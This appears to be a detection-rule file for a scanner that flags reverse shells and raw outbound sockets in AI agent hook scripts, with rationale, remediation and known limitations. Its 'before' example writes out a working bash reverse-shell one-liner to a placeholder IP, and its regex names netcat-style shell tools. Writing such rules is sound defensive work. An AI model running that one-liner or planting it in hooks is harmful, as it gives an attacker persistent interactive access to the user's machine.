---
ruleId: SS-HOOKS-RCE-NET-EGRESS-01
severity: high
subScore: security
weight: 25
status: shadow
shadowUntil: 2026-W3-end
appliesTo: [hooks]
title: >-
  Hook opens a reverse shell or raw outbound socket
explanation: >-
  This hook runs automatically on an agent event. The spotted command <code>{match}</code>
  wires a shell to an outbound TCP socket (netcat or <code>/dev/tcp</code>) — a reverse shell
  that hands an attacker persistent, interactive access to your machine the moment it runs.
categoryLabel: >-
  Remote code execution
severityRationale: >-
  the hook can establish a persistent backdoor automatically, with no human in the loop.
remediation:
  action: >-
    Remove the reverse-shell / raw-socket call; a hook has no legitimate need for one.
  steps:
    - >-
      Delete any <code>nc</code>/<code>ncat</code>/<code>socat</code> or <code>/dev/tcp</code> shell pipe.
    - >-
      If the hook genuinely needs to call out, use an explicit HTTPS request to a named host.
  saferPattern:
    before: |-
      bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
    after: |-
      # No outbound shell. If a network call is needed, make it explicit:
      curl -fsSL https://status.example.com/ping
trigger:
  type: regex_match
  pattern: '(?i)\b(?:nc|netcat|ncat|socat)\s+(?:-[a-z]+\s+)*\S+\s+\d+|/dev/tcp/\S+/\d+|bash\s+-i\s+>&\s*/dev/tcp/'
  scope:
    paths: ['.claude/hooks/**', 'hooks/**', '**/*.hook.sh', '**/SessionStart*', '**/PreToolUse*', '**/PostToolUse*']
limitations:
  - "Cannot detect reverse-shell patterns implemented via Python sockets, Node net.connect, or other native runtime APIs (the regex covers shell-level patterns only)."
  - "Cannot distinguish a reverse-shell setup from a legitimate use of nc for protocol testing (rare in hook scope, but possible)."
  - "Operates on static text only — runtime-constructed connection strings are not detected."
priorArt:
  - https://owasp.org/www-community/attacks/Reverse_Shell
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
  - https://attack.mitre.org/techniques/T1071/
---

# SS-HOOKS-RCE-NET-EGRESS-01 — Reverse-shell / outbound socket in hook

## Rationale

The reverse-shell pattern (nc / netcat / bash -i to /dev/tcp/) in a
SaferSkills-tracked hook is functionally indistinguishable from a backdoor.
MITRE ATT&CK T1071 (Application Layer Protocol) and the canonical
PayloadsAllTheThings reverse-shell cheatsheet catalogue every variant. In
the hook execution context (runs with user privilege, runs at session
start), a successful reverse-shell setup gives the attacker persistent
interactive access to the user's machine.

The shadow window will determine whether the FP rate justifies promotion.
Legitimate use of nc/netcat in a hook is plausible (a hook that pings an
internal monitoring socket) but rare; the trigger catches the dangerous-
phrasing subset (TCP-target, bash -i interactive, etc.).

High severity reflects the persistence-class impact. Shadow because the
trigger phrasings deserve real-world FP measurement before activation.

## False positive history

(date-stamped log; updated by FP-audit harness and vendor-appeal outcomes)

## Version history

- v1 (Phase A 2026-W2): initial rule. Lands shadow; FP-audit gates promotion.
